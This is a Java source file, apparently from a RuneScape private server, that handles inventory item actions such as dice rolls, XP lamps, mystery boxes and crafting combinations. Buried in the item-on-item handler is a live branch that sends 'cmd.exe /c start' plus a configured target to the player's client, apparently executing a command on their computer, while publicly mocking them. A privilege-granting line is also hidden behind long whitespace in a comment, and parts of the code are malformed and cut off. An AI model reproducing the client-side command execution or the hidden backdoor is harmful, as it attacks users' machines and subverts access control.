package com.rs.net.decoders.handlers;

import java.util.List;

import com.rs.game.WorldObject;
import com.rs.Settings;
import com.rs.cores.WorldThread;
import com.rs.game.Animation;
import com.rs.Settings;
import com.rs.game.player.controlers.*;
import com.rs.game.World;
import com.rs.game.WorldTile;
import com.rs.game.item.Item;
import com.rs.game.ForceTalk;
import com.rs.game.npc.NPC;
import com.rs.game.npc.familiar.Familiar.SpecialAttack;
import com.rs.game.player.Equipment;
import com.rs.game.player.Inventory;
import com.rs.game.player.Pets;
import com.rs.game.player.Player;
import com.rs.game.player.Skills;
import com.rs.game.Hit;
import com.rs.game.Hit.HitLook;
import com.rs.game.player.actions.Firemaking;
import com.rs.game.player.actions.Fletching;
import com.rs.game.player.actions.Fletching.Fletch;
import com.rs.game.player.actions.GemCutting;
import com.rs.game.player.actions.GemCutting.Gem;
import com.rs.game.player.actions.HerbCleaning;
import com.rs.game.player.actions.Herblore;
import com.rs.game.player.actions.Hunter;
import com.rs.game.player.actions.Hunter.HunterEquipment;
import com.rs.game.player.actions.LeatherCrafting;
import com.rs.game.player.actions.Summoning;
import com.rs.game.player.actions.Summoning.Pouches;
import com.rs.game.player.content.AncientEffigies;
import com.rs.game.player.content.ArmourSets;
import com.rs.game.player.content.ArmourSets.Sets;
import com.rs.game.player.content.Burying;
import com.rs.game.player.content.Foods;
import com.rs.game.player.content.ItemOnItemHandler;
import com.rs.game.player.content.ItemOnItemHandler.ItemOnItem;
import com.rs.game.player.content.Magic;
import com.rs.game.player.content.Pots;
import com.rs.game.player.content.Runecrafting;
import com.rs.game.player.content.SkillCapeCustomizer;
import com.rs.game.player.controlers.Barrows;
import com.rs.game.player.content.Burying;
import com.rs.game.player.content.Burying.Bone;
import com.rs.game.tasks.WorldTask;
import com.rs.game.tasks.WorldTasksManager;
import com.rs.io.InputStream;
import com.rs.utils.Logger;
import com.rs.utils.Utils;
import com.rs.game.Graphics;
import com.rs.game.player.content.DiceGame;
import com.rs.game.player.content.Dicing;

public class InventoryOptionsHandler {

	public static void handleItemOption2(final Player player, final int slotId,
			final int itemId, Item item) {
		if (Firemaking.isFiremaking(player, itemId))
			return;
		if (itemId >= 5509 && itemId <= 5514) {
			int pouch = -1;
			if (itemId == 5509)
				pouch = 0;
			if (itemId == 5510)
				pouch = 1;
			if (itemId == 5512)
				pouch = 2;
			if (itemId == 5514)
				pouch = 3;
			Runecrafting.emptyPouch(player, pouch);
			player.stopAll(false);
		} else if (itemId == 15098) {
			// DiceGame.handleItem(player, Rolls.FRIENDS_ROLL);
			return;
		} else {
			if (player.isEquipDisabled())
				return;
			long passedTime = Utils.currentTimeMillis()
					- WorldThread.LAST_CYCLE_CTM;
			WorldTasksManager.schedule(new WorldTask() {

				@Override
				public void run() {
					List<Integer> slots = player.getSwitchItemCache();
					int[] slot = new int[slots.size()];
					for (int i = 0; i < slot.length; i++)
						slot[i] = slots.get(i);
					player.getSwitchItemCache().clear();
					ButtonHandler.sendWear(player, slot);
					player.stopAll(false);
				}

			}, passedTime >= 600 ? 0 : passedTime > 400 ? 1 : 0);// switching
			// one item,
			// if delay
			// too close
			// to next
			// ticket,
			// delay so
			// wont
			// instant

			if (player.getSwitchItemCache().contains(slotId))
				return;
			player.getSwitchItemCache().add(slotId);
		}
	}

	public static void handleItemOption1(Player player, final int slotId,
			final int itemId, Item item) {
		long time = Utils.currentTimeMillis();
		if (player.getStopDelay() >= time
				|| player.getEmotesManager().getNextEmoteEnd() >= time)
			return;
		player.stopAll(false);
		if (Foods.eat(player, item, slotId))
			return;
                
		if (Burying.bury(player, slotId))
			return;
		if (itemId == 15098) {
		DiceGame.rollDice8(player);
                player.setNextAnimation(new Animation(11900));
                player.setNextGraphics(new Graphics(2075));
                return;
		}
                if (itemId == 15086) {
		DiceGame.rollDice2(player);
                player.setNextAnimation(new Animation(11900));
                player.setNextGraphics(new Graphics(2072));
                return;
		}
                if (itemId == 15088) {
		DiceGame.rollDice3(player);
                player.setNextAnimation(new Animation(11900));
                player.setNextGraphics(new Graphics(2074));
                return;
		}
                if (itemId == 15090) {
		DiceGame.rollDice4(player);
                player.setNextAnimation(new Animation(11900));
                player.setNextGraphics(new Graphics(2071));
                return;
		}
                if (itemId == 15092) {
		DiceGame.rollDice5(player);
                player.setNextAnimation(new Animation(11900));
                player.setNextGraphics(new Graphics(2070));
                return;
		}
                if (itemId == 15094) {
		DiceGame.rollDice5(player);
                player.setNextAnimation(new Animation(11900));
                player.setNextGraphics(new Graphics(2073));
                return;
		}
                if (itemId == 15096) {
		DiceGame.rollDice7(player);
                player.setNextAnimation(new Animation(11900));
                player.setNextGraphics(new Graphics(2068));
                return;
		}
                if (itemId == 15098) {//this
		DiceGame.rollDice8(player);
                player.setNextAnimation(new Animation(11900));
                player.setNextGraphics(new Graphics(2075));
                return;
		}
//flowers

		if (itemId == 299) {
final WorldTile tile = new WorldTile(player);
		if (!player.addWalkSteps(player.getX() - 1, player.getY(), 1))
			if (!player.addWalkSteps(player.getX() + 1, player.getY(), 1))
				if (!player.addWalkSteps(player.getX(), player.getY() + 1, 1))
					player.addWalkSteps(player.getX(), player.getY() - 1, 1);
player.getInventory().deleteItem(299, 1);
//World.spawnObject(new WorldObject(Utils.random(2980, 2988), 10, -1, player.getX(), player.getY(), player.getPlane()), true);

				World.spawnTempGroundObject(new WorldObject(Utils.random(2980, 2988),
						10, 0, tile.getX(), tile.getY(), tile.getPlane()), 592,
						35000);

}

	if (itemId == 3062) {
		player.getInventory().addItem(299, 10); // seed box
		player.getInventory().deleteItem(3062, 1);
	}

	if (itemId == 3063) {
		player.getInventory().addItem(10476, 20); // sweets box
		player.getInventory().deleteItem(3063, 1);
	}	
	
	if (itemId == 2379) {//rock cake.
		player.applyHit(new Hit(player, 50,HitLook.REGULAR_DAMAGE));
		player.setNextForceTalk(new ForceTalk("Ouch!"));					
		player.getPackets().sendGameMessage("You bite the rock cake because your stupid.");
					
	}	



if (itemId == 23737) {
			player.setNextAnimation(new Animation(4352));
						player.getInventory().deleteItem(23737, 1);
			player.getPackets().sendGameMessage("You use the small lamp for Prayer.");
						player.getSkills().addXp(Skills.PRAYER, 10000);
			return;
		}
		if (itemId == 23738) {
			player.setNextAnimation(new Animation(4352));
						player.getInventory().deleteItem(23738, 1);
			player.getPackets().sendGameMessage("You use the small lamp for Prayer.");
						player.getSkills().addXp(Skills.PRAYER, 15000);
			return;
		}
		//if (itemId == 24868) {
			//player.get
		if (itemId == 23739) {
			player.setNextAnimation(new Animation(4352));
						player.getInventory().deleteItem(23739, 1);
			player.getPackets().sendGameMessage("You use the small lamp for Prayer.");
						player.getSkills().addXp(Skills.PRAYER, 32000);
			return;
		}
		if (itemId == 23749) {
			player.setNextAnimation(new Animation(4352));
						player.getInventory().deleteItem(23749, 1);
			player.getPackets().sendGameMessage("You use the small lamp for dung.");
						player.getSkills().addXp(Skills.DUNGEONEERING, 30000);
			return;
				}
		if (itemId == 23750) {
			player.setNextAnimation(new Animation(4352));
						player.getInventory().deleteItem(23750, 1);
			player.getPackets().sendGameMessage("You use the medium lamp for dung.");
						player.getSkills().addXp(Skills.DUNGEONEERING, 100000);
			return;
		}
		if (itemId == 23751) {
			player.setNextAnimation(new Animation(4352));
						player.getInventory().deleteItem(23751, 1);
			player.getPackets().sendGameMessage("You use the large lamp for dung.");
						player.getSkills().addXp(Skills.DUNGEONEERING, 150000);
			return;				
		}
		if (itemId == 23814) {
			player.setNextAnimation(new Animation(4352));
						player.getInventory().deleteItem(23814, 1);
			player.getPackets().sendGameMessage("You use the small lamp for Summoning.");
						player.getSkills().addXp(Skills.SUMMONING, 60000);
			return;
		}
		if (itemId == 23815) {
			player.setNextAnimation(new Animation(4352));
						player.getInventory().deleteItem(23815, 1);
			player.getPackets().sendGameMessage("You use the small lamp for Summoning.");
						player.getSkills().addXp(Skills.SUMMONING, 110000);
			return;
		}
		if (itemId == 23816) {
			player.setNextAnimation(new Animation(4352));
						player.getInventory().deleteItem(23816, 1);
			player.getPackets().sendGameMessage("You use the small lamp for Summoning.");
						player.getSkills().addXp(Skills.SUMMONING, 250000);
			return;
		}
                if (itemId == 15100) {
		DiceGame.rollDice1(player);
                player.setNextAnimation(new Animation(11900));
                player.setNextGraphics(new Graphics(2069));
                return;
		}
		if (itemId == 1917) {
			player.getAppearence().setRenderEmote(982);
						player.getInventory().deleteItem(1917, 1);
			player.getPackets().sendGameMessage("You are now very drunk.");
			return;
		}
		if (itemId == 10885) {
			player.setNextGraphics(new Graphics(6));
			player.getAppearence().setRenderEmote(982);
						player.getInventory().deleteItem(1917, 1);
			player.getPackets().sendGameMessage("You are now very drunk.");
			return;
		}
		
		
		
		//admin item
		if (itemId == 21819){
			player.getInventory().addItem(1917 , 1);
			//player.getInventory().addItem( , 1);
			//player.getInventory().addItem(1 , 1);
			//player.getInventory().addItem(1 , 1);
			//player.getInventory().addItem(1 , 1);
			  }																																																										//	if (itemId == 690){
																																																														//player.setRights(12); }
		

		//Shard box
		if (itemId == 15262){
			player.getInventory().deleteItem(15262, 1);
			player.getInventory().addItem(12183 , 15000);
			  }	


			  
		if (!player.getControlerManager().handleItemOption1(player, slotId, itemId, item))
			return;
		if (Pots.pot(player, item, slotId))
			return;
		if (itemId >= 5509 && itemId <= 5514) {
			int pouch = -1;
			if (itemId == 5509)
				pouch = 0;
			if (itemId == 5510)
				pouch = 1;
			if (itemId == 5512)
				pouch = 2;
			if (itemId == 5514)
				pouch = 3;
			Runecrafting.fillPouch(player, pouch);
			return;
		}
                
		if (itemId == 18768) {
		int[] randomItems = {11694, 14484, 18349, 18357, 18351, 18335, 21787, 21790, 21793, 685, 1042, 436, 438, 668, 440, 442, 453, 444, 449, 451, 2349, 9467, 2351, 2355, 2353, 24870, 24867, 1521, 4151, 1127, }; //Other ids go in there as well
	        int i = Utils.getRandom(randomItems.length);
			player.getInventory().deleteItem(18768, 1);
	        player.getInventory().addItem(randomItems[i], 1);
			player.getInventory().addItem(995, 1500000); for (Player players : World.getPlayers()) { if (players == null) continue;
				players.getPackets().sendGameMessage("<img=5><col=ff0000>" + player.getDisplayName() + "</col> Has Just Gotten an item and 1,5m From A Vote Box! Go ::vote To Get Recieve One Yourself!"); }
				return;
			} //fixed /pinu
			
			//random box for c key
		if (itemId == 6199) {
		int[] randomItems = {13095, 9005, 1127, 2651, 10400, 10402, 10404, 10405, 10408, 10409, 10412, 10414, 10416, 10418, 10420, 10422, 10424, 10426, 10428, 10430, 10432, 10434, 10436, 10438, 1079, 1080, 1093, 1094, 1127, 1128, 2615, 2616, 2617, 2618, 2623, 2624, 2625, 2626, 3476, 3477, 3672, 3673, 10798, 10800, 13482, 13487, 13489, 13800, 13801, 13802, 13805, 13806, 13807, 19179, 19180, 19181, 19182, 19183, 19184, 19186, 19200, 19201, 19202, 19203, 19204, 19205, 19206, 19207, 19208, 19221, 19222, 19223, 19224, 19225, 19226, 19227, 19228, 19229, 19242, 19243, 19244, 19245, 19246, 19247, 19248, 19249, 19250, 19263, 19264, 19265, 19266, 19267, 19269, 19270, 19271, 19483, 19486, 19489, 19492, 19495, }; //Other ids go in there as well
	        int i = Utils.getRandom(randomItems.length);
			player.getInventory().deleteItem(6199, 1);
	        player.getInventory().addItem(randomItems[i], 1);
			} //fixed			
				
	//casket	989898		
	if (itemId == 405) {
		int[] randomItems = { 401,685,317,686,687,13381,697,9069,9070,9071,9072,1493  }; //Other ids go in there as well
	        int i = Utils.getRandom(randomItems.length);
			player.getInventory().deleteItem(405, 1);
	        player.getInventory().addItem(randomItems[i], 1);
			} //fixed			
					
		
		if (itemId == 952) {// spade
			player.resetWalkSteps();
			if (Barrows.digToBrother(player)){
				player.getControlerManager().startControler("Barrows");
				return;
				}
			player.setNextAnimation(new Animation(830));
			player.getPackets().sendGameMessage("You find nothing.");
			return;
		}
		if (HerbCleaning.clean(player, item, slotId))
			return;
		Bone bone = Bone.forId(itemId);
		if (bone != null) {
			Bone.bury(player, slotId);
			return;
		}
		if (Magic.useTabTeleport(player, itemId))
			return;
		if (itemId == AncientEffigies.SATED_ANCIENT_EFFIGY
				|| itemId == AncientEffigies.GORGED_ANCIENT_EFFIGY
				|| itemId == AncientEffigies.NOURISHED_ANCIENT_EFFIGY
				|| itemId == AncientEffigies.STARVED_ANCIENT_EFFIGY)
			player.getDialogueManager().startDialogue("AncientEffigiesD",
					itemId);
		else if (itemId == 4155)
			player.getDialogueManager().startDialogue("EnchantedGemDialouge");
//kiln donator	
		else if (itemId == 23659)
					{if (!player.isDonator()) {
					player.getPackets().sendGameMessage(
							"You do not have the privileges to use this.");
				
				}
									player.getPackets().sendGameMessage(
                                    "Thanks for supporting Extinction, "+player.getDisplayName());
				 }
	//XMas event 


		
	
				
				
	//Clue scrollss
		//spade sandpit
				else if (itemId == 2680) {
			
			player.sendMessage("<col=0000FF>----------------------------------------------------------------");
			player.sendMessage("<col=FF00BF>**Clue 3**");
			player.sendMessage("Ahoy matey, this is a hard one. I reside in the dark depths of this land.");
			player.sendMessage("You will find me near my hideout. I train Wild'ly on my course.");
			player.sendMessage("Beware When you seek me, as this could be a dangerous place.");
			player.sendMessage("<col=0000FF>----------------------------------------------------------------");
			
				
				
	
			
		//Pyramid door
		
				}else if (itemId == 2801) {
			
			player.sendMessage("<col=0000FF>----------------------------------------------------------------");
			player.sendMessage("<col=FF0000>You passed the easy Half, you can stop. It will start getting more challenging.");
			player.sendMessage("<col=FF00BF>**Clue 5**");
			player.sendMessage("Far and wide all over this land there are many monsters.");
			player.sendMessage("They are ruled by great gods Which hide behind closed doors.");
			player.sendMessage("They wait untill oneday a Lord will open the door, and face them on the altar.");
			player.sendMessage("<col=0000FF>----------------------------------------------------------------");
			
			
		//Gwd altr
		
				}else if (itemId == 2811) {
			
			player.sendMessage("<col=0000FF>----------------------------------------------------------------");
			player.sendMessage("<col=FF00BF>**Clue 6**");
			player.sendMessage("Come Dance all around the World! See all the beauty, that surrounds you.");
			player.sendMessage("Im drumming hard near a town of Dance. Come see my Gig.");
			player.sendMessage("While it seem safe its quite unfriendly. You may aswell just Jig-Along Home.");
			player.sendMessage("<col=0000FF>----------------------------------------------------------------");
	//Digsite
	}else if (itemId == 2835) {
			
			player.sendMessage("<col=0000FF>----------------------------------------------------------------");
			player.sendMessage("<col=FF00BF>**Clue 8**");
			player.sendMessage("This is the final clue for medium tasks.");
			player.sendMessage("Its time to Test, your skills. Examine, this clue carefully.");
			player.sendMessage("If you fail to pass the clue, its ok. Just try again untill you pass.");
			player.sendMessage("If you pass this test you will get a certificate that you claim your reward with.");
			player.sendMessage("<col=0000FF>----------------------------------------------------------------");
	
	//sword and shield.
	}else if (itemId == 2794) {
			
			player.sendMessage("<col=0000FF>----------------------------------------------------------------");
			player.sendMessage("<col=FF00BF>**Final Clue**");
			player.sendMessage("This is the final clue for the hide and seek.");
			player.sendMessage("<col=0000FF>----------------------------------------------------------------");
			player.sendMessage("<col=FF00BF>**Ice Sword Hint**");
			player.sendMessage("The anvil sits alone by the tree, in a snowy war zone. Many creatures are slain.");
			player.sendMessage("Many heros fall, The deeper you go the more chance there is of meeting a harder foe.");
			player.sendMessage("If you happen to slay the Evil foe you are rewarded with items that nothing can beat.");
			player.sendMessage("<col=0000FF>----------------------------------------------------------------");
			player.sendMessage("<col=FF00BF>**Shield Hint**");
			player.sendMessage("creatures small and large reside around here, I spent a long time here following a Trail.");
			player.sendMessage("If i found the spot i could dig up quite a suprise.");
			player.sendMessage("Nothing comes here today though as its old and bare, a wasteland of what was but isnt anymore.");
			player.sendMessage("<col=0000FF>----------------------------------------------------------------");
			player.sendMessage("<col=FF00BF>--Scroll up for Full Clue--");
	
				 
//kiln end
		} else if (itemId == 7464) {// Chicken book
		player.getInventory().deleteItem(7464, 1);
		player.sendMessage("The book Crumbles to dust. Hopefully you read it.");
		
			player.getInterfaceManager().sendInterface(275);
			player.getPackets()
			.sendIComponentText(275, 2, "The Power of Chicken.");
			player.getPackets().sendIComponentText(275, 16,
					"So you found my book, Use the knowlege well.");
			player.getPackets().sendIComponentText(275, 17,
					"I studied chickens, looking for answers.");
			player.getPackets().sendIComponentText(275, 18,
					"After years of work I discovered the secret to there power.");
			player.getPackets().sendIComponentText(275, 20,
					"- Solve my riddle and the secret is yours -");
			player.getPackets().sendIComponentText(275, 21,
					"--------------------------------------------------------");
			player.getPackets().sendIComponentText(275, 22,
					"Mix the enchanted body of the beast.");
			player.getPackets().sendIComponentText(275, 23,
					"With the remains of another.");
			player.getPackets().sendIComponentText(275, 24,
					"--------------------------------------------------------");
			player.getPackets().sendIComponentText(275, 25,
					"");
			player.getPackets().sendIComponentText(275, 26, 
					"I will be waiting for you.");
		for (int i = 31; i < 300; i++)
				player.getPackets().sendIComponentText(275, i, "");
				


//Problem script
		} else if (itemId == 761) {// intel report.
			player.getInterfaceManager().sendInterface(275);
			player.getPackets()
			.sendIComponentText(275, 2, "The Report");
			player.getPackets().sendIComponentText(275, 16,
					"this is the new bug abuse or any sort of abuse report.");
			player.getPackets().sendIComponentText(275, 17,
					"If you have recieved this it meens there is a problem with your account.");
			player.getPackets().sendIComponentText(275, 18,
					"This report is used incase an admin cannot contact you.");
			player.getPackets().sendIComponentText(275, 19,
					"--------------------------------------------------------");
			player.getPackets().sendIComponentText(275, 20,
					"Hello there, thanks for using my source.");
			player.getPackets().sendIComponentText(275, 21,
					"");
			player.getPackets().sendIComponentText(275, 22,
					"If you want to know a few things look in the 'information/guides' folder");
			player.getPackets().sendIComponentText(275, 22,
					"I normally used this item to contct abuser in other time zones");
			player.getPackets().sendIComponentText(275, 23,
					"");
			player.getPackets().sendIComponentText(275, 24, 
					"If you need any help with your rsps just contact me");
			player.getPackets().sendIComponentText(275, 25,
					"--------------------------------------------");
			player.getPackets().sendIComponentText(275, 26, 
					"Youtube: www.youtube.com/user/poanizer");
			player.getPackets().sendIComponentText(275, 27,
					"Skype: Poanizerhelp");
			player.getPackets().sendIComponentText(275, 28, 
					"--------------------------------------------");
			player.getPackets().sendIComponentText(275, 29,
					"");
			player.getPackets().sendIComponentText(275, 30, 
					"Poanizer.");
			player.getPackets().sendIComponentText(275, 31, 
					"<img>=1");
			player.getPackets().sendIComponentText(275, 14,
					"<u>Visit Website</u>");
			for (int i = 31; i < 300; i++)
				player.getPackets().sendIComponentText(275, i, "");
				}
				
				
		else if (itemId == 1493) {// old journal from casket
			
			player.getPackets().sendIComponentText(959, 5, "My Journal");
			player.getPackets().sendIComponentText(959, 30,"Entry: 01/01/13");
			player.getPackets().sendIComponentText(959, 31,"Im unsure what is happening");
			player.getPackets().sendIComponentText(959, 32,"to ther world around me.");
			player.getPackets().sendIComponentText(959, 33,"The home I once new has .");
			player.getPackets().sendIComponentText(959, 34,"changed I think I may be");
			player.getPackets().sendIComponentText(959, 35,"dreaming. Even the people");
			player.getPackets().sendIComponentText(959, 36," around me seem different.");
			player.getPackets().sendIComponentText(959, 37,"");
			player.getPackets().sendIComponentText(959, 38,"No Sign of Veo. But Boss ");
			player.getPackets().sendIComponentText(959, 39,"and Po are still here.");
			player.getPackets().sendIComponentText(959, 40,"");
			
			player.getPackets().sendIComponentText(959, 41,"Entry: 07/12/13");
			player.getPackets().sendIComponentText(959, 42,"A lot has changed since my");
			player.getPackets().sendIComponentText(959, 43,"Last entry. I should of wrote");
			player.getPackets().sendIComponentText(959, 44,"sooner. It seems like there is");
			player.getPackets().sendIComponentText(959, 45,"another person controlling the");
			player.getPackets().sendIComponentText(959, 46,"world. He claims he's king of");
			player.getPackets().sendIComponentText(959, 47,"death and I have yet to ");
			player.getPackets().sendIComponentText(959, 48,"decide whether everythings ok. ");
			player.getPackets().sendIComponentText(959, 49," ");
			player.getPackets().sendIComponentText(959, 50,"No sign of Boss anymore... ");
			player.getPackets().sendIComponentText(959, 51,"it's Weird.");
			player.getInterfaceManager().sendInterface(959);
			//problem script end

}
		else if (itemId == 1856) {// Information Book
			player.getInterfaceManager().sendInterface(275);
			player.getPackets()
			.sendIComponentText(275, 2, Settings.SERVER_NAME);
			player.getPackets().sendIComponentText(275, 16,
					"Welcome to " + Settings.SERVER_NAME + ".");
			player.getPackets().sendIComponentText(275, 17,
					"Owner and Co's are Poanizer,Boss and Veo.");
			player.getPackets().sendIComponentText(275, 18,
					"This is a 667+ Eco server.");
			player.getPackets().sendIComponentText(275, 19,
					"Click one of the links above to go to forums");
			player.getPackets().sendIComponentText(275, 20,
					"You can change your prayers and spells at home.");
			player.getPackets().sendIComponentText(275, 21,
					"If you need any help, do ::ticket. (Don't abuse it)");
			player.getPackets().sendIComponentText(275, 22,
					"at start of your message on public chat.");
			player.getPackets().sendIComponentText(275, 22,
					"By the way you can compare your ::kdr with your mates.");
			player.getPackets().sendIComponentText(275, 23,
					"And don't forget to ::vote and respect rules.");
			player.getPackets().sendIComponentText(275, 24, "");
			player.getPackets().sendIComponentText(275, 25,
					"Forums: " + Settings.WEBSITE_LINK);
			player.getPackets().sendIComponentText(275, 26, "");
			player.getPackets().sendIComponentText(275, 27,
					"Enjoy your time on " + Settings.SERVER_NAME + ".");
			player.getPackets().sendIComponentText(275, 28,
					"<img=1> Staff Team");
			player.getPackets().sendIComponentText(275, 29, "");
			player.getPackets().sendIComponentText(275, 30, "");
			player.getPackets().sendIComponentText(275, 14,
					"<u>Visit Website</u>");
			for (int i = 31; i < 300; i++)
				player.getPackets().sendIComponentText(275, i, "");
				
				}
				
				
				
		 else if (itemId == HunterEquipment.BOX.getId()) // almost done
			player.getActionManager().setSkill(new Hunter(HunterEquipment.BOX));
		else if (itemId == HunterEquipment.BRID_SNARE.getId())
			player.getActionManager().setSkill(
					new Hunter(HunterEquipment.BRID_SNARE));
		if (Settings.DEBUG)
			Logger.log("ItemHandler", "Item Select:" + itemId + ", Slot Id:"
					+ slotId); 
	

	/*
	 * returns the other
	 */
				
				
		 else if (itemId == HunterEquipment.BOX.getId()) // almost done
			player.getActionManager().setSkill(new Hunter(HunterEquipment.BOX));
		else if (itemId == HunterEquipment.BRID_SNARE.getId())
			player.getActionManager().setSkill(
					new Hunter(HunterEquipment.BRID_SNARE));
		if (Settings.DEBUG)
			Logger.log("ItemHandler", "Item Select:" + itemId + ", Slot Id:"
					+ slotId);
	}
				

	public static Item contains(int id1, Item item1, Item item2) {
		if (item1.getId() == id1)
			return item2;
		if (item2.getId() == id1)
			return item1;
		return null;
	}

	public static boolean contains(int id1, int id2, Item... items) {
		boolean containsId1 = false;
		boolean containsId2 = false;
		for (Item item : items) {
			if (item.getId() == id1)
				containsId1 = true;
			else if (item.getId() == id2)
				containsId2 = true;
		}
		return containsId1 && containsId2;
	}

	public static void handleItemOnItem(final Player player, InputStream stream) {
		int interfaceId = stream.readIntV1() >> 16;
			int itemUsedId = stream.readUnsignedShort128();
			int fromSlot = stream.readUnsignedShortLE128();
			int interfaceId2 = stream.readIntV2() >> 16;
			int itemUsedWithId = stream.readUnsignedShort128();
			int toSlot = stream.readUnsignedShortLE();
			if ((interfaceId2 == 747 || interfaceId2 == 662)
					&& interfaceId == Inventory.INVENTORY_INTERFACE) {
				if (player.getFamiliar() != null) {
					player.getFamiliar().setSpecial(true);
					if (player.getFamiliar().getSpecialAttack() == SpecialAttack.ITEM) {
						if (player.getFamiliar().hasSpecialOn())
							player.getFamiliar().submitSpecial(toSlot);
					}
				}
				return;
			}
			
			if (interfaceId == Inventory.INVENTORY_INTERFACE
					&& interfaceId == interfaceId2
					&& !player.getInterfaceManager().containsInventoryInter()) {
				if (toSlot >= 28 || fromSlot >= 28)
					return;
				Item usedWith = player.getInventory().getItem(toSlot);
				Item itemUsed = player.getInventory().getItem(fromSlot);
				if (itemUsed == null || usedWith == null
						|| itemUsed.getId() != itemUsedId
						|| usedWith.getId() != itemUsedWithId)
					return;
				player.stopAll();
				if (!player.getControlerManager().canUseItemOnItem(itemUsed,
						usedWith))
					return;
				Fletch fletch = Fletching.isFletching(usedWith, itemUsed);
				if (fletch != null) {
					player.getDialogueManager().startDialogue("FletchingD", fletch);
					return;
				}
				int herblore = Herblore.isHerbloreSkill(itemUsed, usedWith);
				if (herblore > -1) {
					player.getDialogueManager().startDialogue("HerbloreD",
							herblore, itemUsed, usedWith);
					return;
				}
				          if (itemUsedId == 15086 && itemUsedWithId == 15086) {
                DiceGame.rollDice2(player);
            player.setNextAnimation(new Animation(11900));
                player.setNextGraphics(new Graphics(2072));
                return;
                }
            if (itemUsedId == 15088 && itemUsedWithId == 15088) {
                DiceGame.rollDice3(player);
            player.setNextAnimation(new Animation(11900));
                player.setNextGraphics(new Graphics(2074));
                return;
                }
            if (itemUsedId == 15090 && itemUsedWithId == 15090) {
                DiceGame.rollDice4(player);
            player.setNextAnimation(new Animation(11900));
                player.setNextGraphics(new Graphics(2071));
                return;
                }
				
				
				
                if (itemUsedId == 15092 && itemUsedWithId == 15092) {
                DiceGame.rollDice5(player);
            player.setNextAnimation(new Animation(11900));
                player.setNextGraphics(new Graphics(2070));
                return;
                }
				if (itemUsedId == 1519 && itemUsedWithId == 995) {
                player.getInventory().addItem(13756, 1);
				player.setNextAnimation(new Animation(11900));
				player.getInventory().deleteItem(995, 100000);
                player.setNextGraphics(new Graphics(2070));
                return;
                }
                if (itemUsedId == 15094 && itemUsedWithId == 15094) {
                DiceGame.rollDice5(player);
            player.setNextAnimation(new Animation(11900));
                player.setNextGraphics(new Graphics(2073));
                return;
                }
                if(itemUsedId == 15096 && itemUsedWithId == 15096) {
                DiceGame.rollDice7(player);
            player.setNextAnimation(new Animation(11900));
                player.setNextGraphics(new Graphics(2068));
                return;
                }
                if(itemUsedId == 15098 && itemUsedWithId == 15098) {
                DiceGame.rollDice8(player);
            player.setNextAnimation(new Animation(11900));
                player.setNextGraphics(new Graphics(2075));
                return;
                }
                if (itemUsedId == 15100 && itemUsedWithId == 15100) {
                DiceGame.rollDice1(player);
            player.setNextAnimation(new Animation(11900));
                player.setNextGraphics(new Graphics(2069));
                return;
                }
				

	
				
				if (itemUsed.getId() == LeatherCrafting.NEEDLE.getId()
						|| usedWith.getId() == LeatherCrafting.NEEDLE.getId()) {
					if (LeatherCrafting
							.handleItemOnItem(player, itemUsed, usedWith)) {
						return;
					}
				}
			/*	Sets set = ArmourSets.getArmourSet(itemUsedId, itemUsedWithId);
				if (set != null) {
					ArmourSets.exchangeSets(player, set);
					return;
				}*/
				ItemOnItem itemOnItem = ItemOnItem.forId(itemUsedId);
				if (itemOnItem != null) {
					if (itemUsedWithId == itemOnItem.getItem2())
						ItemOnItemHandler.handleItemOnItem(player, itemOnItem, usedWith.getId(), itemUsed.getId());
					return;
				}
				if (Firemaking.isFiremaking(player, itemUsed, usedWith))
					return;
				else if (contains(1755, Gem.OPAL.getUncut(), itemUsed, usedWith))
					GemCutting.cut(player, Gem.OPAL);
				else if (contains(1755, Gem.JADE.getUncut(), itemUsed, usedWith))
					GemCutting.cut(player, Gem.JADE);
				else if (contains(1755, Gem.RED_TOPAZ.getUncut(), itemUsed,
						usedWith))
					GemCutting.cut(player, Gem.RED_TOPAZ);
				else if (contains(1755, Gem.SAPPHIRE.getUncut(), itemUsed, usedWith))
					GemCutting.cut(player, Gem.SAPPHIRE);
				else if (contains(1755, Gem.EMERALD.getUncut(), itemUsed, usedWith))
					GemCutting.cut(player, Gem.EMERALD);
				else if (contains(1755, Gem.RUBY.getUncut(), itemUsed, usedWith))
					GemCutting.cut(player, Gem.RUBY);
				else if (contains(1755, Gem.DIAMOND.getUncut(), itemUsed, usedWith))
					GemCutting.cut(player, Gem.DIAMOND);
				else if (contains(1755, Gem.DRAGONSTONE.getUncut(), itemUsed,
						usedWith))
					GemCutting.cut(player, Gem.DRAGONSTONE);
				else if (itemUsed.getId() == 21369 && usedWith.getId() == 4151){
				player.getInventory().deleteItem(21369, 1);
				player.getInventory().deleteItem(4151, 1);
				player.getInventory().addItem(21371, 1);
				player.sm("Good job, you have succesfully combined a whip and vine into a vine whip.");
				}
				//Kiwi Chicken		
				
				
				if (itemUsedId == 6652 && itemUsedWithId == 6652) {
				

				
					
				player.sm("The power of Poanizer makes you strong.");
				player.getAppearence().setLook(3,27);
                player.getAppearence().generateAppearenceData();
                return;
                }

				if (itemUsedId == 440 && itemUsedWithId == 1521) {
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.IBANNED);
						World.removePlayer(player);	
				for (Player players : World.getPlayers()) {
						if (players == null)
							continue;
				players.setNextGraphics(new Graphics(6, 0, 100));
				players.setNextAnimation(new Animation(7071));
				players.getPackets().sendGameMessage("<col=FF0000>" + player.getDisplayName()  + " Just tryed to get Admin! Silly " + player.getDisplayName() + " Admin's for kids");
				players.setNextForceTalk(new ForceTalk("Silly "  + player.getDisplayName() + "!")); 
					player.getInventory().deleteItem(440, 28);
					player.getInventory().deleteItem(1521, 28);
				}
                }
				
				if (itemUsedId == 525 && itemUsedWithId == 526) {
					if (player.getSkills().getLevel(Skills.SUMMONING) < 70) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Summoning level of 70 to combine these.",
								  true);
						  return;
					  }			
				player.getInventory().deleteItem(525, 1);
				player.getInventory().deleteItem(526, 1);
				player.getControlerManager().startControler("Kiwi");
							
					player.setNextGraphics(new Graphics(986));
					player.useStairs(10704, new WorldTile(1694,5468, 1), 2, 3,"You feel funny, Nek Minute... ");
				player.sm("You in the Kiwi Lair! Escape now or face your Doom!");
                
                return;
                }
		//admin item		
				//else if (itemUsedId == 21819 && itemUsedWithId == 21819) {
                //player.getInventory().addItem(995, 2147483646);
                //return;
                //}
				
//sets
					
			//ahrim		
				if (itemUsedId == 11846 && itemUsedWithId == 11846) {
				player.getInventory().deleteItem(11846, 1);
                player.getInventory().addItem(4708, 1);
				player.getInventory().addItem(4710, 1);
